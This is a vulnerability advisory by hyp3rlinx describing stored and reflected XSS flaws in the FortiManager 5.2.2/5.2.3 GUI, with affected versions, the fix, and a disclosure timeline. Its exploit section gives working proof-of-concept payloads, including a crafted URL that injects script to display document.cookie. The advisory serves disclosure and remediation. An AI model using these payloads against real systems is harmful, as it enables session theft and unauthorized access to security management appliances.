@@ -1,0 +1,137 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-FORTIMANAGER-XSS-0924.txt
+
+
+
+Vendor:
+================================
+www.fortinet.com
+
+
+
+Product:
+================================
+FortiManager v5.2.2
+
+FortiManager is a centralized security management appliance that allows you
+to
+centrally manage any number of Fortinet Network Security devices.
+
+
+Vulnerability Type:
+===================
+Multiple Cross Site Scripting ( XSS ) in FortiManager GUI
+http://www.fortiguard.com/advisory/multiple-xss-vulnerabilities-in-fortimanager-gui
+
+
+
+CVE Reference:
+==============
+Pending
+
+
+
+
+
+Vulnerability Details:
+=====================
+
+The Graphical User Interface (GUI) of FortiManager v5.2.2 is
+vulnerable to two reflected Cross-Site Scripting (XSS) vulnerabilities.
+2 potential XSS vectors were identified:
+
+* XSS vulnerability in SOMVpnSSLPortalDialog.
+* XSS vulnerability in FGDMngUpdHistory.
+
+The Graphical User Interface (GUI) of FortiManager v5.2.3 is vulnerable to
+one reflected XSS vulnerability and one stored XSS vulnerability.
+2 potential XSS vectors were identified:
+
+* XSS vulnerability in sharedjobmanager.
+* XSS vulnerability in SOMServiceObjDialog.
+
+Affected Products
+
+XSS items 1-2: FortiManager v5.2.2 or earlier.
+XSS items 3-4: FortiManager v5.2.3 or earlier.
+
+
+Solutions:
+===========
+No workarounds are currently available.
+Update to FortiManager v5.2.4.
+
+
+Exploit code(s):
+===============
+
+1- Persistent:
+https://localhost/cgi-bin/module/sharedobjmanager/firewall/SOMServiceObjDialog?devGrpId=18446744073709551615&deviceId=18446744073709551615&vdom=&adomId=3&vdomID=0&adomType=ems&cate=167&prodId=0&key=ALL&catetype=167&cate=167&permit_w=1&roid=189&startIndex=0&results=50
+
+<div class="ui-comments-div"><textarea  id="_comp_15" name="_comp_15"
+class="ui-comments-text" cols="58" maxlength="255"
+ maxnum="255" placeholder="Write a comment"
+rows="1"><script>alert(666)</script>&lt;/textarea&gt;<label
+class="ui-comments-remaining">
+
+
+2- Reflected
+https://localhost/cgi-bin/module/sharedobjmanager/policy_new/874/PolicyTable?vdom=%22%27/%3E%3C/script%3E%3Cscript%3Ealert%28%27[XSS%20FortiManager%20POC%20VM64%20v5.2.2%2008042015%20]\n\n%27%2bdocument.cookie%29%3C/script%3E
+<https://localhost/cgi-bin/module/sharedobjmanager/policy_new/874/PolicyTable?vdom=%22%27/%3E%3C/script%3E%3Cscript%3Ealert%28%27[XSS%20FortiManager%20POC%20VM64%20v5.2.2%2008042015%20]%5Cn%5Cn%27%2bdocument.cookie%29%3C/script%3E>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification:  August 4, 2015
+September 24, 2015 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote & Local
+
+
+
+Severity Level:
+=========================================================
+Medium (3)
+
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] GET
+
+
+Vulnerable Product:             [+] FortiManager v5.2.2  & v5.2.3 or earlier
+
+
+Vulnerable Parameter(s):        [+] vdom, textarea field
+
+
+Affected Area(s):               [+] sharedobjmanager, SOMServiceObjDialog
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
